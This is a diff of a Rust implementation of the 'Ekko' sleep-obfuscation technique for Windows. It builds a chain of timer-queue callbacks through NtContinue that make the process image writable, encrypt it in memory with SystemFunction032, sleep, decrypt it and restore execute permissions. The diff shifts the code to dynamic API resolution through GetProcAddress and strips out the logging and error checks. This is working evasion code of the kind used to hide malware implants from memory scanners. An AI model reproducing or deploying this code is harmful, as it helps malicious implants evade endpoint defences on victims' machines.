@@ -1,40 +1,48 @@
-use ntapi::{ntxcapi::NtContinue, winapi::shared::ntdef::NTSTATUS};
 use std::{
     ffi::c_void,
     ptr::{null, null_mut},
 };
 use windows_sys::Win32::{
-    Foundation::{HANDLE, UNICODE_STRING, BOOLEAN, GetLastError},
+    Foundation::{GetLastError, HANDLE},
     System::{
-        Diagnostics::Debug::{IMAGE_NT_HEADERS64, RtlCaptureContext, CONTEXT},
-        LibraryLoader::{GetModuleHandleA},
-        Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
+        Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
+        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
+        Memory::{PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
         SystemServices::IMAGE_DOS_HEADER,
         Threading::{
-            CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue, SetEvent,
-            WaitForSingleObject, WT_EXECUTEINTIMERTHREAD,
+            CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue,
+            WaitForSingleObject, WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD,
         },
         WindowsProgramming::INFINITE,
     },
 };
 
+/*
 pub unsafe extern "system" fn call_rtl_capture_context(param0: *mut c_void, _param1: BOOLEAN) {
     // Retrieves a context record in the context of the caller.
     // https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext
     RtlCaptureContext(param0.cast());
 }
 
-/* 
+
 pub unsafe extern "system" fn call_nt_continue(param0: *mut c_void, _param1: BOOLEAN) {
     // You can use NtContinue after processing exception for continue executing thread. System uses NtContinue also in APC processing.
     // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html
     //https://doxygen.reactos.org/d6/d9e/include_2reactos_2wine_2winternl_8h.html#ac28b5db9f434d0762d6bebc7dcdd608f
     NtContinue(param0.cast(), 0);
 }
-*/
 
 extern "system" {
-    fn SystemFunction032(data: *mut UNICODE_STRING, key: *const UNICODE_STRING) -> NTSTATUS;
+    fn SystemFunction032(data: *mut UString, key: *const UString) -> NTSTATUS;
+}
+*/
+
+//https://doxygen.reactos.org/da/dab/structustring.html
+#[repr(C)]
+struct UString {
+    length: u32,
+    maximum_length: u32,
+    buffer: *mut u8,
 }
 
 pub fn ekko(sleep_time: u32) {
@@ -73,55 +81,83 @@ pub fn ekko(sleep_time: u32) {
     log::info!("[+] Image Size: {:#x}", image_size as u64);
 
     let mut secret = "1234567890ABCDEF\0".as_bytes().to_vec();
-    let key = UNICODE_STRING {
-        Length: secret.len() as u16,
-        MaximumLength: secret.len() as u16,
-        Buffer: secret.as_mut_ptr() as *mut u16,
+    let key = UString {
+        length: secret.len() as u32,
+        maximum_length: secret.len() as u32,
+        buffer: secret.as_mut_ptr(),
     };
 
-    let mut image_buffer: Vec<u8> = unsafe { std::slice::from_raw_parts_mut(image_base as *mut u8, image_size as _).to_vec() };
+    let mut image_buffer: Vec<u8> =
+        unsafe { std::slice::from_raw_parts_mut(image_base as *mut u8, image_size as _).to_vec() };
 
-    let mut data = UNICODE_STRING {
-        Length: image_buffer.len() as u16,
-        MaximumLength: image_buffer.len() as u16,
-        Buffer: image_buffer.as_mut_ptr() as *mut u16,
+    let mut data = UString {
+        length: image_buffer.len() as u32,
+        maximum_length: image_buffer.len() as u32,
+        buffer: image_buffer.as_mut_ptr(),
     };
+
+    let rtl_capture_context = unsafe {
+        GetProcAddress(
+            LoadLibraryA("ntdll\0".as_ptr()),
+            "RtlCaptureContext\0".as_ptr(),
+        )
+        .unwrap() as u64
+    };
+    let rtl_capture_context_ptr =
+        unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(rtl_capture_context) };
+    let nt_continue = unsafe {
+        GetProcAddress(
+            GetModuleHandleA("ntdll\0".as_ptr()),
+            "NtContinue\0".as_ptr(),
+        )
+        .unwrap() as u64
+    };
+    let nt_continue_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(nt_continue) };
+
+    let system_function032 = unsafe {
+        GetProcAddress(
+            LoadLibraryA("Advapi32\0".as_ptr()),
+            "SystemFunction032\0".as_ptr(),
+        )
+        .unwrap() as u64
+    };
+
+    let kernel32_handle = unsafe { LoadLibraryA("kernel32\0".as_ptr()) };
+    let virtual_protect =
+        unsafe { GetProcAddress(kernel32_handle, "VirtualProtect\0".as_ptr()).unwrap() as u64 };
+    let wait_for_single_object = unsafe {
+        GetProcAddress(kernel32_handle, "WaitForSingleObject\0".as_ptr()).unwrap() as u64
+    };
+    let set_event =
+        unsafe { GetProcAddress(kernel32_handle, "SetEvent\0".as_ptr()).unwrap() as u64 };
 
     log::info!("[+] Calling CreateTimerQueueTimer with ctx_thread");
-    pause();   
-    
+    //pause();
+
     // Contains processor-specific register data. The system uses CONTEXT structures to perform various internal operations.
     // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context
     let ctx_thread = unsafe { std::mem::zeroed::<ProperlyAlignedContext>() };
 
     // Creates a timer-queue timer. This timer expires at the specified due time, then after every specified period. When the timer expires, the callback function is called.
-    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueuetimer 
-    let result = unsafe {
+    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueuetimer
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_rtl_capture_context),
-            &ctx_thread as *const ProperlyAlignedContext as *mut c_void,
+            rtl_capture_context_ptr,
+            &ctx_thread as *const _ as *const _,
             0,
             0,
             WT_EXECUTEINTIMERTHREAD,
         )
     };
 
-    if result == 0 {
-        panic!("[!] CreateTimerQueueTimer failed with error: {}", unsafe {
-            GetLastError()
-        });
-    }
-
-    log::info!("[+] Calling WaitForSingleObject for 0x32 ms");
     // Waits until the specified object is in the signaled state or the time-out interval elapses.
     // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
     unsafe {
         WaitForSingleObject(h_event, 0x32);
     }
 
-    log::info!("[+] Copying ctx_thread to rop chains");
     // Clone not required as it implements the copy trait
     let mut rop_prot_rw = ctx_thread;
     let mut rop_mem_enc = ctx_thread;
@@ -130,161 +166,123 @@ pub fn ekko(sleep_time: u32) {
     let mut rop_prot_rx = ctx_thread;
     let mut rop_set_evt = ctx_thread;
 
-    log::info!("[+] Building ROP chain");
     // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
     // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
     rop_prot_rw.Rsp -= 8;
-    rop_prot_rw.Rip = VirtualProtect as u64;
+    rop_prot_rw.Rip = virtual_protect as u64;
     rop_prot_rw.Rcx = image_base as *const c_void as u64;
     rop_prot_rw.Rdx = image_size as u64;
     rop_prot_rw.R8 = PAGE_READWRITE as u64;
     rop_prot_rw.R9 = &mut old_protect as *mut PAGE_PROTECTION_FLAGS as u64;
-    dump_virtual_protect_context(&rop_prot_rw);
+    //dump_virtual_protect_context(&rop_prot_rw);
 
     // https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725
     // NTSTATUS WINAPI SystemFunction032(struct ustring *data, const struct ustring *key)
     // pub unsafe extern "system" fn SystemFunction032(randombuffer: *mut UNICODE_STRING, key: *const UNICODE_STRING) -> BOOLEAN
     rop_mem_enc.Rsp -= 8;
-    rop_mem_enc.Rip = SystemFunction032 as u64;
+    rop_mem_enc.Rip = system_function032 as u64;
     rop_mem_enc.Rcx = &mut data as *mut _ as u64;
     rop_mem_enc.Rdx = &key as *const _ as u64;
-    dump_system_function032_context(&rop_mem_enc);
+    //dump_system_function032_context(&rop_mem_enc);
 
     // pub unsafe extern "system" fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WIN32_ERROR
     // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.WaitForSingleObject.html
     rop_delay.Rsp -= 8;
-    rop_delay.Rip = WaitForSingleObject as u64;
+    rop_delay.Rip = wait_for_single_object as u64;
     rop_delay.Rcx = -1 as isize as u64; // NtCurrentProcess
     rop_delay.Rdx = sleep_time as u64;
-    dump_wait_for_single_object_context(&rop_delay);
+    //dump_wait_for_single_object_context(&rop_delay);
 
     // https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725
     // NTSTATUS WINAPI SystemFunction032(struct ustring *data, const struct ustring *key)
     // pub unsafe extern "system" fn SystemFunction032(randombuffer: *mut UNICODE_STRING, key: *const UNICODE_STRING) -> BOOLEAN
     rop_mem_dec.Rsp -= 8;
-    rop_mem_dec.Rip = SystemFunction032 as u64;
+    rop_mem_dec.Rip = system_function032 as u64;
     rop_mem_dec.Rcx = &mut data as *mut _ as u64;
     rop_mem_dec.Rdx = &key as *const _ as u64;
-    dump_system_function032_context(&rop_mem_dec);
+    //dump_system_function032_context(&rop_mem_dec);
 
     // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
     // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
     rop_prot_rx.Rsp -= 8;
-    rop_prot_rx.Rip = VirtualProtect as u64;
+    rop_prot_rx.Rip = virtual_protect as u64;
     rop_prot_rx.Rcx = image_base as *const c_void as u64;
     rop_prot_rx.Rdx = image_size as u64;
     rop_prot_rx.R8 = PAGE_EXECUTE_READWRITE as u64;
     rop_prot_rx.R9 = &mut old_protect as *mut u32 as u64;
-    dump_virtual_protect_context(&rop_prot_rx);
+    //dump_virtual_protect_context(&rop_prot_rx);
 
     // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.SetEvent.html
     // pub unsafe extern "system" fn SetEvent(hevent: HANDLE) -> BOOL
     rop_set_evt.Rsp -= 8;
-    rop_set_evt.Rip = SetEvent as u64;
+    rop_set_evt.Rip = set_event as u64;
     rop_set_evt.Rcx = h_event as u64;
-    dump_set_event_context(&rop_set_evt);
+    //dump_set_event_context(&rop_set_evt);
 
-    log::info!("[+] Rop chain built");
-    log::info!("[+] Queue timers");
-
-    type WaitOrTimerCallbackFn = unsafe extern "system" fn(param0: *mut c_void, param1: BOOLEAN);
-    let ntcontinue: WaitOrTimerCallbackFn = unsafe { std::mem::transmute::<_, WaitOrTimerCallbackFn>(NtContinue as *mut u64) };
-
-    let result = unsafe {
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(ntcontinue),
+            nt_continue_ptr,
             &rop_prot_rw as *const _ as *const _,
             100,
             0,
             WT_EXECUTEINTIMERTHREAD,
         )
     };
-    if result == 0 {
-        panic!(
-            "[!] Failed calling CreateTimerQueueTimer with rop_prot_rw (VirtualProtect RW) {:#x}",
-            unsafe { GetLastError() }
-        );
-    }
 
-    let result = unsafe {
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(ntcontinue),
+            nt_continue_ptr,
             &rop_mem_enc as *const _ as *const _,
             200,
             0,
             WT_EXECUTEINTIMERTHREAD,
         )
     };
-    if result == 0 {
-        panic!(
-            "[!] Failed calling CreateTimerQueueTimer with rop_mem_enc (SystemFunction032) {:#x}",
-            unsafe { GetLastError() }
-        );
-    }
 
-    let result = unsafe {
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(ntcontinue),
+            nt_continue_ptr,
             &rop_delay as *const _ as *const _,
             300,
             0,
             WT_EXECUTEINTIMERTHREAD,
         )
     };
-    if result == 0 {
-        panic!(
-            "[!] Failed calling CreateTimerQueueTimer with rop_delay (WaitForSingleObject) {:#x}",
-            unsafe { GetLastError() }
-        );
-    }
 
-    let result = unsafe {
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(ntcontinue),
+            nt_continue_ptr,
             &rop_mem_dec as *const _ as *const _,
             400,
             0,
             WT_EXECUTEINTIMERTHREAD,
         )
     };
-    if result == 0 {
-        panic!(
-            "[!] Failed calling CreateTimerQueueTimer with rop_mem_dec (SystemFunction032) {:#x}",
-            unsafe { GetLastError() }
-        );
-    }
 
-    let result = unsafe {
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(ntcontinue),
+            nt_continue_ptr,
             &rop_prot_rx as *const _ as *const _,
             500,
             0,
             WT_EXECUTEINTIMERTHREAD,
         )
     };
-    if result == 0 {
-        panic!(
-            "[!] Failed calling CreateTimerQueueTimer with rop_prot_rx (VirtualProtect RX) {:#x}",
-            unsafe { GetLastError() }
-        );
-    }
-
-    let result = unsafe {
+    unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(ntcontinue),
+            nt_continue_ptr,
             &rop_set_evt as *const _ as *const _,
             600,
             0,
@@ -292,20 +290,9 @@ pub fn ekko(sleep_time: u32) {
         )
     };
 
-    if result == 0 {
-        panic!(
-            "[!] Failed calling CreateTimerQueueTimer with rop_set_evt (SetEvent) {:#x}",
-            unsafe { GetLastError() }
-        );
-    }
-
-    //log::info!("[+] Waiting for event...");
-
     unsafe {
         WaitForSingleObject(h_event, INFINITE);
     } //0xFFFFFFFF
-
-    //log::info!("[+] Finished waiting for event");
 
     // Deletes a timer queue. Any pending timers in the queue are canceled and deleted.
     // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-deletetimerqueue
@@ -316,16 +303,20 @@ pub fn ekko(sleep_time: u32) {
 
 // BUG in windows-rs/windows-sys and WINAPI: https://github.com/microsoft/win32metadata/issues/1044
 #[derive(Clone, Copy)]
-#[repr(align(16))] 
+#[repr(align(16))]
 struct ProperlyAlignedContext(pub CONTEXT);
 
 impl core::ops::Deref for ProperlyAlignedContext {
     type Target = CONTEXT;
-    fn deref(&self) -> &CONTEXT { &self.0 }
+    fn deref(&self) -> &CONTEXT {
+        &self.0
+    }
 }
 
 impl core::ops::DerefMut for ProperlyAlignedContext {
-    fn deref_mut(&mut self) -> &mut CONTEXT { &mut self.0 }
+    fn deref_mut(&mut self) -> &mut CONTEXT {
+        &mut self.0
+    }
 }
 
 #[allow(dead_code)]
@@ -345,6 +336,7 @@ pub fn pause() {
     };
 }
 
+#[allow(dead_code)]
 fn dump_virtual_protect_context(rop: &ProperlyAlignedContext) {
     log::info!(
         "[+] RSP: {:#x} RIP: {:#x} -> VirtualProtect({:#x}, {:#x}, {:#x}, {:#x})",
@@ -357,6 +349,7 @@ fn dump_virtual_protect_context(rop: &ProperlyAlignedContext) {
     );
 }
 
+#[allow(dead_code)]
 fn dump_system_function032_context(rop: &ProperlyAlignedContext) {
     log::info!(
         "[+] RSP: {:#x} RIP: {:#x} -> SystemFunction032({:#x}, {:#x})",
@@ -367,6 +360,7 @@ fn dump_system_function032_context(rop: &ProperlyAlignedContext) {
     );
 }
 
+#[allow(dead_code)]
 fn dump_wait_for_single_object_context(rop: &ProperlyAlignedContext) {
     log::info!(
         "[+] RSP: {:#x} RIP: {:#x} -> WaitForSingleObject({:#x}, {:#x})",
@@ -377,6 +371,7 @@ fn dump_wait_for_single_object_context(rop: &ProperlyAlignedContext) {
     );
 }
 
+#[allow(dead_code)]
 fn dump_set_event_context(rop: &ProperlyAlignedContext) {
     log::info!(
         "[+] RSP: {:#x} RIP: {:#x} -> SetEvent({:#x})",
